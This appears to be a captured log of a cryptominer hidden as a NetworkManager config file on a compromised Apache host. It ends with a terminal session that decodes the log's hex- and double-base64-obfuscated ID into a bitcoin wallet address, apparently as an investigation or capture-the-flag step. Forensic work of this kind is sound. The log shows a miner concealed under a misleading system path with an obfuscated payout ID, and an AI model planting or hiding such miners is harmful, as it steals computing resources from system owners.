+2025-11-01 15:38:23,970 [*] Miner()
+2025-11-01 15:38:25,973 [*] Miner()
+2025-11-01 15:38:27,976 [*] Miner()
+2025-11-01 15:38:29,978 [*] Miner()
+2025-11-01 15:38:31,980 [*] Miner()
+2025-11-01 15:38:33,984 [*] Miner()
+2025-11-01 15:38:35,986 [*] Miner()
+2025-11-01 15:38:37,989 [*] Miner()
+2025-11-01 15:38:39,991 [*] Miner()
+2025-11-01 15:38:41,993 [*] Miner()
+2025-11-01 15:38:43,996 [*] Miner()
+2025-11-01 15:38:45,998 [*] Miner()
+2025-11-01 15:38:48,000 [*] Miner()
+2025-11-01 15:38:50,003 [*] Miner()
+2025-11-01 15:38:52,013 [*] Miner()
+2025-11-01 15:38:54,016 [*] Miner()
+2025-11-01 15:38:56,048 [*] Miner()
+2025-11-01 15:38:58,050 [*] Miner()
+2025-11-01 15:39:00,055 [*] Miner()
+2025-11-01 15:39:02,058 [*] Miner()
+2025-11-01 15:39:04,060 [*] Miner()
+2025-11-01 15:39:06,062 [*] Miner()
+2025-11-01 15:39:08,065 [*] Miner()
+2025-11-01 15:39:10,067 [*] Miner()
+2025-11-01 15:39:12,077 [*] Miner()
+2025-11-01 15:39:14,079 [*] Miner()
+2025-11-01 15:39:16,091 [*] Miner()
+2025-11-01 15:39:18,094 [*] Miner()
+2025-11-01 15:39:20,101 [*] Miner()
+2025-11-01 15:39:22,107 [*] Miner()
+2025-11-01 15:39:24,114 [*] Miner()
+2025-11-01 15:39:26,116 [*] Miner()
+2025-11-01 15:39:28,119 [*] Miner()
+2025-11-01 15:39:30,125 [*] Miner()
+2025-11-01 15:39:32,128 [*] Miner()
+2025-11-01 15:39:34,138 [*] Miner()
+2025-11-01 15:39:36,141 [*] Miner()
+2025-11-01 15:39:38,143 [*] Miner()
+2025-11-01 15:39:40,145 [*] Miner()
+2025-11-01 15:39:42,148 [*] Miner()
+2025-11-01 15:39:44,159 [*] Miner()
+2025-11-01 15:39:46,166 [*] Miner()
+2025-11-01 15:39:48,168 [*] Miner()
+2025-11-01 15:39:50,170 [*] Miner()
+2025-11-01 15:39:52,173 [*] Miner()
+2025-11-01 15:39:54,180 [*] Miner()
+2025-11-01 15:39:56,183 [*] Miner()
+2025-11-01 15:39:58,185 [*] Miner()
+2025-11-01 15:40:00,188 [*] Miner()
+2025-11-01 15:40:02,191 [*] Miner()
+2025-11-01 15:40:04,193 [*] Miner()
+2025-11-01 15:40:06,206 [*] Miner()
+2025-11-01 15:40:08,210 [*] Miner()
+2025-11-01 15:40:10,212 [*] Miner()
+2025-11-01 15:40:12,214 [*] Miner()
+2025-11-01 15:40:14,217 [*] Miner()
+2025-11-01 15:40:16,220 [*] Miner()
+2025-11-01 15:40:18,222 [*] Miner()
+2025-11-01 15:40:20,225 [*] Miner()
+2025-11-01 15:40:22,227 [*] Miner()
+2025-11-01 15:40:24,229 [*] Miner()
+2025-11-01 15:40:26,233 [*] Miner()
+2025-11-01 15:40:28,235 [*] Miner()
+2025-11-01 15:40:30,237 [*] Miner()
+2025-11-01 15:40:32,240 [*] Miner()
+2025-11-01 15:40:34,242 [*] Miner()
+2025-11-01 15:40:36,245 [*] Miner()
+2025-11-01 15:40:38,248 [*] Miner()
+2025-11-01 15:40:40,250 [*] Miner()
+2025-11-01 15:40:42,252 [*] Miner()
+2025-11-01 15:40:44,255 [*] Miner()
+2025-11-01 15:40:46,257 [*] Miner()
+2025-11-01 15:40:48,260 [*] Miner()
+2025-11-01 15:40:50,262 [*] Miner()
+2025-11-01 15:40:52,265 [*] Miner()
+2025-11-01 15:40:54,267 [*] Miner()
+2025-11-01 15:40:56,271 [*] Miner()
+2025-11-01 15:40:58,273 [*] Miner()
+2025-11-01 15:41:00,275 [*] Miner()
+2025-11-01 15:41:02,278 [*] Miner()
+2025-11-01 15:41:04,280 [*] Miner()
+2025-11-01 15:41:06,282 [*] Miner()
+2025-11-01 15:41:08,287 [*] Miner()
+2025-11-01 15:41:10,289 [*] Miner()
+2025-11-01 15:41:12,292 [*] Miner()
+2025-11-01 15:41:14,294 [*] Miner()
+2025-11-01 15:41:16,296 [*] Miner()
+2025-11-01 15:41:18,299 [*] Miner()
+2025-11-01 15:41:20,306 [*] Miner()
+2025-11-01 15:41:22,308 [*] Miner()
+2025-11-01 15:41:24,315 [*] Miner()
+2025-11-01 15:41:26,317 [*] Miner()
+2025-11-01 15:41:28,320 [*] Miner()
+2025-11-01 15:41:30,322 [*] Miner()
+2025-11-01 15:41:32,325 [*] Miner()
+2025-11-01 15:41:34,328 [*] Miner()
+2025-11-01 15:41:36,337 [*] Miner()
+2025-11-01 15:41:38,339 [*] Miner()
+2025-11-01 15:41:40,342 [*] Miner()
+2025-11-01 15:41:42,373 [*] Miner()
+2025-11-01 15:41:44,387 [*] Miner()
+2025-11-01 15:41:46,401 [*] Miner()
+2025-11-01 15:41:48,411 [*] Miner()
+2025-11-01 15:41:50,433 [*] Miner()
+2025-11-01 15:41:52,433 [*] Miner()
+2025-11-01 15:41:54,452 [*] Miner()
+2025-11-01 15:41:56,471 [*] Miner()
+2025-11-01 15:41:58,485 [*] Miner()
+2025-11-01 15:42:00,531 [*] Miner()
+2025-11-01 15:42:02,533 [*] Miner()
+2025-11-01 15:42:04,569 [*] Miner()
+2025-11-01 15:42:06,595 [*] Miner()
+2025-11-01 15:42:08,598 [*] Miner()
+2025-11-01 15:42:10,612 [*] Miner()
+2025-11-01 15:42:12,630 [*] Miner()
+2025-11-01 15:42:14,653 [*] Miner()
+2025-11-01 15:42:16,712 [*] Miner()
+2025-11-01 15:42:18,735 [*] Miner()
+2025-11-01 15:42:20,772 [*] Miner()
+2025-11-01 15:42:22,835 [*] Miner()
+2025-11-01 15:42:24,838 [*] Miner()
+2025-11-01 15:42:26,851 [*] Miner()
+2025-11-01 15:42:28,862 [*] Miner()
+2025-11-01 15:42:30,864 [*] Miner()
+2025-11-01 15:42:32,875 [*] Miner()
+2025-11-01 15:42:34,885 [*] Miner()
+2025-11-01 15:42:36,888 [*] Miner()
+2025-11-01 15:42:38,907 [*] Miner()
+2025-11-01 15:42:40,910 [*] Miner()
+2025-11-01 15:42:42,912 [*] Miner()
+2025-11-01 15:42:44,921 [*] Miner()
+2025-11-01 15:42:46,932 [*] Miner()
+2025-11-01 15:42:48,936 [*] Miner()
+2025-11-01 15:42:50,938 [*] Miner()
+2025-11-01 15:42:52,993 [*] Miner()
+2025-11-01 15:42:55,004 [*] Miner()
+2025-11-01 15:42:57,015 [*] Miner()
+2025-11-01 15:42:59,033 [*] Miner()
+2025-11-01 15:43:01,049 [*] Miner()
+2025-11-01 15:43:03,055 [*] Miner()
+2025-11-01 15:43:05,063 [*] Miner()
+2025-11-01 15:43:07,065 [*] Miner()
+2025-11-01 15:43:09,076 [*] Miner()
+2025-11-01 15:43:11,110 [*] Miner()
+2025-11-01 15:43:13,123 [*] Miner()
+2025-11-01 15:43:15,126 [*] Miner()
+2025-11-01 15:43:17,141 [*] Miner()
+2025-11-01 15:43:19,144 [*] Miner()
+2025-11-01 15:43:21,153 [*] Miner()
+2025-11-01 15:43:23,155 [*] Miner()
+2025-11-01 15:43:25,157 [*] Miner()
+2025-11-01 15:43:27,165 [*] Miner()
+2025-11-01 15:43:29,167 [*] Miner()
+2025-11-01 15:43:31,201 [*] Miner()
+2025-11-01 15:43:33,218 [*] Miner()
+2025-11-01 15:43:35,219 [*] Miner()
+2025-11-01 15:43:37,221 [*] Miner()
+2025-11-01 15:43:39,222 [*] Miner()
+2025-11-01 15:43:41,223 [*] Miner()
+2025-11-01 15:43:43,256 [*] Miner()
+2025-11-01 15:43:45,257 [*] Miner()
+2025-11-01 15:43:47,271 [*] Miner()
+2025-11-01 15:43:49,287 [*] Miner()
+2025-11-01 15:43:51,323 [*] Miner()
+2025-11-01 15:43:53,352 [*] Miner()
+2025-11-01 15:43:55,353 [*] Miner()
+2025-11-01 15:43:57,365 [*] Miner()
+2025-11-01 15:43:59,387 [*] Miner()
+2025-11-01 15:44:01,420 [*] Miner()
+2025-11-01 15:44:03,450 [*] Miner()
+2025-11-01 15:44:05,465 [*] Miner()
+2025-11-01 15:44:07,468 [*] Miner()
+2025-11-01 15:44:09,490 [*] Miner()
+2025-11-01 15:44:11,513 [*] Miner()
+2025-11-01 15:44:13,560 [*] Miner()
+2025-11-01 15:44:15,584 [*] Miner()
+2025-11-01 15:44:17,628 [*] Miner()
+2025-11-01 15:44:19,661 [*] Miner()
+2025-11-01 15:44:21,682 [*] Miner()
+2025-11-01 15:44:23,746 [*] Miner()
+2025-11-01 15:44:25,755 [*] Miner()
+2025-11-01 15:44:27,831 [*] Miner()
+2025-11-01 15:44:29,835 [*] Miner()
+2025-11-01 15:44:31,849 [*] Miner()
+2025-11-01 15:44:33,851 [*] Miner()
+2025-11-01 15:44:35,853 [*] Miner()
+2025-11-01 15:44:37,863 [*] Miner()
+2025-11-01 15:44:39,866 [*] Miner()
+2025-11-01 15:44:41,868 [*] Miner()
+2025-11-01 15:44:43,879 [*] Miner()
+2025-11-01 15:44:45,883 [*] Miner()
+2025-11-01 15:44:47,885 [*] Miner()
+2025-11-01 15:44:49,887 [*] Miner()
+2025-11-01 15:44:51,905 [*] Miner()
+2025-11-01 15:44:53,919 [*] Miner()
+2025-11-01 15:44:55,921 [*] Miner()
+2025-11-01 15:44:57,927 [*] Miner()
+2025-11-01 15:44:59,931 [*] Miner()
+2025-11-01 15:45:01,935 [*] Miner()
+2025-11-01 15:45:03,944 [*] Miner()
+2025-11-01 15:45:05,947 [*] Miner()
+2025-11-01 15:45:07,949 [*] Miner()
+2025-11-01 15:45:09,952 [*] Miner()
+2025-11-01 15:45:11,954 [*] Miner()
+2025-11-01 15:45:13,956 [*] Miner()
+2025-11-01 15:45:15,957 [*] Miner()
+2025-11-01 15:45:17,959 [*] Miner()
+2025-11-01 15:45:19,961 [*] Miner()
+2025-11-01 15:45:21,963 [*] Miner()
+2025-11-01 15:45:23,965 [*] Miner()
+2025-11-01 15:45:25,969 [*] Miner()
+2025-11-01 15:45:27,971 [*] Miner()
+2025-11-01 15:45:29,973 [*] Miner()
+2025-11-01 15:45:31,975 [*] Miner()
+2025-11-01 15:45:33,977 [*] Miner()
+2025-11-01 15:45:35,980 [*] Miner()
+2025-11-01 15:45:37,983 [*] Miner()
+2025-11-01 15:45:39,985 [*] Miner()
+2025-11-01 15:45:41,985 [*] Miner()
+2025-11-01 15:45:43,987 [*] Miner()
+2025-11-01 15:45:45,990 [*] Miner()
+2025-11-01 15:45:47,997 [*] Miner()
+2025-11-01 15:45:49,999 [*] Miner()
+2025-11-01 15:45:52,006 [*] Miner()
+2025-11-01 15:45:54,009 [*] Miner()
+2025-11-01 15:45:56,012 [*] Miner()
+2025-11-01 15:45:58,017 [*] Miner()
+2025-11-01 15:46:00,030 [*] Miner()
+2025-11-01 15:46:02,032 [*] Miner()
+2025-11-01 15:46:04,033 [*] Miner()
+2025-11-01 15:46:06,035 [*] Miner()
+2025-11-01 15:46:08,049 [*] Miner()
+2025-11-01 15:46:10,052 [*] Miner()
+2025-11-01 15:46:12,073 [*] Miner()
+2025-11-01 15:46:14,090 [*] Miner()
+2025-11-01 15:46:16,096 [*] Miner()
+2025-11-01 15:46:18,098 [*] Miner()
+2025-11-01 15:46:20,100 [*] Miner()
+2025-11-01 15:46:22,103 [*] Miner()
+2025-11-01 15:46:24,105 [*] Miner()
+2025-11-01 15:46:26,107 [*] Miner()
+2025-11-01 15:46:28,110 [*] Miner()
+2025-11-01 15:46:30,112 [*] Miner()
+2025-11-01 15:46:32,114 [*] Miner()
+2025-11-01 15:46:34,117 [*] Miner()
+2025-11-01 15:46:36,120 [*] Miner()
+2025-11-01 15:46:38,126 [*] Miner()
+2025-11-01 15:46:40,138 [*] Miner()
+2025-11-01 15:46:42,144 [*] Miner()
+2025-11-01 15:46:44,158 [*] Miner()
+2025-11-01 15:46:46,174 [*] Miner()
+2025-11-01 15:46:48,178 [*] Miner()
+2025-11-01 15:46:50,189 [*] Miner()
+2025-11-01 15:46:52,199 [*] Miner()
+2025-11-01 15:46:54,202 [*] Miner()
+2025-11-01 15:46:56,212 [*] Miner()
+2025-11-01 15:46:58,219 [*] Miner()
+2025-11-01 15:47:00,221 [*] Miner()
+2025-11-01 15:47:02,224 [*] Miner()
+2025-11-01 15:47:04,227 [*] Miner()
+2025-11-01 15:47:06,237 [*] Miner()
+2025-11-01 15:47:08,239 [*] Miner()
+2025-11-01 15:47:10,241 [*] Miner()
+2025-11-01 15:47:12,243 [*] Miner()
+2025-11-01 15:47:14,245 [*] Miner()
+2025-11-01 15:47:16,247 [*] Miner()
+2025-11-01 15:47:18,250 [*] Miner()
+2025-11-01 15:47:20,252 [*] Miner()
+2025-11-01 15:47:22,256 [*] Miner()
+2025-11-01 15:47:24,269 [*] Miner()
+2025-11-01 15:47:26,271 [*] Miner()
+2025-11-01 15:47:28,282 [*] Miner()
+2025-11-01 15:47:30,285 [*] Miner()
+2025-11-01 15:47:32,295 [*] Miner()
+2025-11-01 15:47:34,302 [*] Miner()
+2025-11-01 15:47:36,305 [*] Miner()
+2025-11-01 15:47:38,307 [*] Miner()
+2025-11-01 15:47:40,318 [*] Miner()
+2025-11-01 15:47:42,332 [*] Miner()
+2025-11-01 15:47:44,335 [*] Miner()
+2025-11-01 15:47:46,355 [*] Miner()
+2025-11-01 15:47:48,358 [*] Miner()
+2025-11-01 15:47:50,359 [*] Miner()
+2025-11-01 15:47:52,366 [*] Miner()
+2025-11-01 15:47:54,369 [*] Miner()
+2025-11-01 15:47:56,383 [*] Miner()
+2025-11-01 15:47:58,410 [*] Miner()
+2025-11-01 15:48:00,429 [*] Miner()
+2025-11-01 15:48:02,518 [*] Miner()
+2025-11-01 15:48:04,519 [*] Miner()
+2025-11-01 15:48:06,537 [*] Miner()
+2025-11-01 15:48:08,540 [*] Miner()
+2025-11-01 15:48:10,543 [*] Miner()
+2025-11-01 15:48:12,546 [*] Miner()
+2025-11-01 15:48:14,556 [*] Miner()
+2025-11-01 15:48:16,560 [*] Miner()
+2025-11-01 15:48:18,565 [*] Miner()
+2025-11-01 15:48:20,595 [*] Miner()
+2025-11-01 15:48:22,602 [*] Miner()
+2025-11-01 15:48:24,605 [*] Miner()
+2025-11-01 15:48:26,608 [*] Miner()
+2025-11-01 15:48:28,612 [*] Miner()
+2025-11-01 15:48:30,616 [*] Miner()
+2025-11-01 15:48:32,619 [*] Miner()
+2025-11-01 15:48:34,623 [*] Miner()
+2025-11-01 15:48:36,625 [*] Miner()
+2025-11-01 15:48:38,629 [*] Miner()
+2025-11-01 15:48:40,631 [*] Miner()
+2025-11-01 15:48:42,634 [*] Miner()
+2025-11-01 15:48:44,637 [*] Miner()
+2025-11-01 15:48:46,639 [*] Miner()
+2025-11-01 15:48:48,641 [*] Miner()
+2025-11-01 15:48:50,641 [*] Miner()
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2025-11-01 15:49:57,403 [*] confbak: Ready!
+2025-11-01 15:49:57,404 [*] Status: Mining!
+2025-11-01 15:50:01,412 [*] Miner()
+2025-11-01 15:50:01,412 [*] Bitcoin Miner Thread Started
+2025-11-01 15:50:01,412 [*] Status: Mining!
+2025-11-01 15:50:03,437 [*] Miner()
+2025-11-01 15:50:05,446 [*] Miner()
+2025-11-01 15:50:07,460 [*] Miner()
+2025-11-01 15:50:09,461 [*] Miner()
+2025-11-01 15:50:11,469 [*] Miner()
+2025-11-01 15:50:13,473 [*] Miner()
+2025-11-01 15:50:15,476 [*] Miner()
+2025-11-01 15:50:17,478 [*] Miner()
+2025-11-01 15:50:19,479 [*] Miner()
+2025-11-01 15:50:21,481 [*] Miner()
+2025-11-01 15:50:23,484 [*] Miner()
+2025-11-01 15:50:25,485 [*] Miner()
+2025-11-01 15:50:27,488 [*] Miner()
+2025-11-01 15:50:29,490 [*] Miner()
+2025-11-01 15:50:31,492 [*] Miner()
+2025-11-01 15:50:33,493 [*] Miner()
+2025-11-01 15:50:35,496 [*] Miner()
+2025-11-01 15:50:37,498 [*] Miner()
+2025-11-01 15:50:39,501 [*] Miner()
+2025-11-01 15:50:41,503 [*] Miner()
+2025-11-01 15:50:43,505 [*] Miner()
+2025-11-01 15:50:45,508 [*] Miner()
+2025-11-01 15:50:47,509 [*] Miner()
+2025-11-01 15:50:49,512 [*] Miner()
+2025-11-01 15:50:51,513 [*] Miner()
+2025-11-01 15:50:53,516 [*] Miner()
+2025-11-01 15:50:55,517 [*] Miner()
+2025-11-01 15:50:57,520 [*] Miner()
+2025-11-01 15:50:59,522 [*] Miner()
+2025-11-01 15:51:01,524 [*] Miner()
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2025-11-05 21:57:43,607 [*] confbak: Ready!
+2025-11-05 21:57:43,607 [*] Status: Mining!
+2025-11-05 21:57:47,612 [*] Miner()
+2025-11-05 21:57:47,612 [*] Bitcoin Miner Thread Started
+2025-11-05 21:57:47,612 [*] Status: Mining!
+2025-11-05 21:57:49,613 [*] Miner()
+2025-11-05 21:57:51,616 [*] Miner()
+2025-11-05 21:57:53,617 [*] Miner()
+2025-11-05 21:57:55,620 [*] Miner()
+2025-11-05 21:57:57,621 [*] Miner()
+2025-11-05 21:57:59,624 [*] Miner()
+2025-11-05 21:58:01,625 [*] Miner()
+2025-11-05 21:58:03,628 [*] Miner()
+2025-11-05 21:58:05,628 [*] Miner()
+2025-11-05 21:58:07,629 [*] Miner()
+2025-11-05 21:58:09,632 [*] Miner()
+2025-11-05 21:58:11,634 [*] Miner()
+2025-11-05 21:58:13,636 [*] Miner()
+2025-11-05 21:58:15,637 [*] Miner()
+2025-11-05 21:58:17,640 [*] Miner()
+2025-11-05 21:58:19,641 [*] Miner()
+2025-11-05 21:58:21,644 [*] Miner()
+2025-11-05 21:58:23,646 [*] Miner()
+2025-11-05 21:58:25,648 [*] Miner()
+2025-11-05 21:58:27,650 [*] Miner()
+2025-11-05 21:58:29,653 [*] Miner()
+2025-11-05 21:58:31,655 [*] Miner()
+2025-11-05 21:58:33,657 [*] Miner()
+2025-11-05 21:58:35,660 [*] Miner()
+2025-11-05 21:58:37,662 [*] Miner()
+2025-11-05 21:58:39,664 [*] Miner()
+2025-11-05 21:58:41,667 [*] Miner()
+2025-11-05 21:58:43,669 [*] Miner()
+2025-11-05 21:58:45,671 [*] Miner()
+2025-11-05 21:58:47,674 [*] Miner()
+2025-11-05 21:58:49,676 [*] Miner()
+2025-11-05 21:58:51,678 [*] Miner()
+2025-11-05 21:58:53,681 [*] Miner()
+2025-11-05 21:58:55,683 [*] Miner()
+2025-11-05 21:58:57,685 [*] Miner()
+2025-11-05 21:58:59,688 [*] Miner()
+2025-11-05 21:59:01,690 [*] Miner()
+2025-11-05 21:59:03,693 [*] Miner()
+2025-11-05 21:59:05,695 [*] Miner()
+2025-11-05 21:59:07,699 [*] Miner()
+2025-11-05 21:59:09,701 [*] Miner()
+2025-11-05 21:59:11,704 [*] Miner()
+2025-11-05 21:59:13,706 [*] Miner()
+2025-11-05 21:59:15,708 [*] Miner()
+2025-11-05 21:59:17,757 [*] Miner()
+2025-11-05 21:59:19,769 [*] Miner()
+apache@ip-10-49-147-114:/lib/NetworkManager$ head -50 inet.conf
+head -50 inet.conf
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-08 10:46:04,743 [*] confbak: Ready!
+2024-04-08 10:46:04,743 [*] Status: Mining!
+2024-04-08 10:46:08,745 [*] Miner()
+2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
+2024-04-08 10:46:08,745 [*] Status: Mining!
+2024-04-08 10:46:10,747 [*] Miner()
+2024-04-08 10:46:12,748 [*] Miner()
+2024-04-08 10:46:14,751 [*] Miner()
+2024-04-08 10:46:16,753 [*] Miner()
+2024-04-08 10:46:18,755 [*] Miner()
+2024-04-08 10:46:20,757 [*] Miner()
+2024-04-08 10:46:22,760 [*] Miner()
+2024-04-08 10:46:24,762 [*] Miner()
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-08 10:48:04,647 [*] confbak: Ready!
+2024-04-08 10:48:04,648 [*] Status: Mining!
+2024-04-08 10:48:08,649 [*] Miner()
+2024-04-08 10:48:08,649 [*] Bitcoin Miner Thread Started
+2024-04-08 10:48:08,649 [*] Status: Mining!
+2024-04-08 10:48:10,651 [*] Miner()
+2024-04-08 10:48:12,653 [*] Miner()
+2024-04-08 10:48:14,656 [*] Miner()
+2024-04-08 10:48:16,656 [*] Miner()
+2024-04-08 10:48:18,659 [*] Miner()
+2024-04-08 10:48:20,660 [*] Miner()
+2024-04-08 10:48:22,663 [*] Miner()
+2024-04-08 10:48:24,666 [*] Miner()
+2024-04-08 10:48:26,668 [*] Miner()
+2024-04-08 10:48:28,671 [*] Miner()
+2024-04-08 10:48:30,672 [*] Miner()
+2024-04-08 10:48:32,674 [*] Miner()
+2024-04-08 10:48:34,675 [*] Miner()
+2024-04-08 10:48:36,676 [*] Miner()
+2024-04-08 10:48:38,678 [*] Miner()
+2024-04-08 10:48:40,680 [*] Miner()
+2024-04-08 10:48:42,681 [*] Miner()
+2024-04-08 10:48:44,684 [*] Miner()
+2024-04-08 10:48:46,686 [*] Miner()
+2024-04-08 10:48:48,690 [*] Miner()
+2024-04-08 10:48:50,692 [*] Miner()
+2024-04-08 10:48:52,694 [*] Miner()
+2024-04-08 10:48:54,697 [*] Miner()
+2024-04-08 10:48:56,700 [*] Miner()
+2024-04-08 10:48:58,702 [*] Miner()
+2024-04-08 10:49:00,705 [*] Miner()
+2024-04-08 10:49:02,708 [*] Miner()
+2024-04-08 10:49:04,711 [*] Miner()
+2024-04-08 10:49:06,713 [*] Miner()
+2024-04-08 10:49:08,715 [*] Miner()
+apache@ip-10-49-147-114:/lib/NetworkManager$ grep '^ID:' inet.conf | awk '{print $2}' | xxd -r -p | base64 -d | base64 -d
+<wk '{print $2}' | xxd -r -p | base64 -d | base64 -d
+apache@ip-10-49-147-114:/lib/NetworkManager$ grep '^ID:' inet.conf
+grep '^ID:' inet.conf
+Binary file inet.conf matches
+apache@ip-10-49-147-114:/lib/NetworkManager$ grep 'ID:' inet.conf
+grep 'ID:' inet.conf
+Binary file inet.conf matches
+apache@ip-10-49-147-114:/lib/NetworkManager$ grep '^ID:' inet.conf
+grep '^ID:' inet.conf
+Binary file inet.conf matches
+apache@ip-10-49-147-114:/lib/NetworkManager$ grep '^ID:' inet.conf | awk '{print $2}' | xxd -r -p
+<ep '^ID:' inet.conf | awk '{print $2}' | xxd -r -p
+apache@ip-10-49-147-114:/lib/NetworkManager$ python3 -c "import base64;h = '5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d';print(base64.b64decode(base64.b64decode(bytes.fromhex(h))).decode())"
+<code(base64.b64decode(bytes.fromhex(h))).decode())"
+bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
+apache@ip-10-49-147-114:/lib/NetworkManager$
+
+apache@ip-10-49-147-114:/lib/NetworkManager$ exit
+exit
+exit
+
+
+python3 -c "import base64;h = '5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d';print(base64.b64decode(base64.b64decode(bytes.fromhex(h))).decode())"
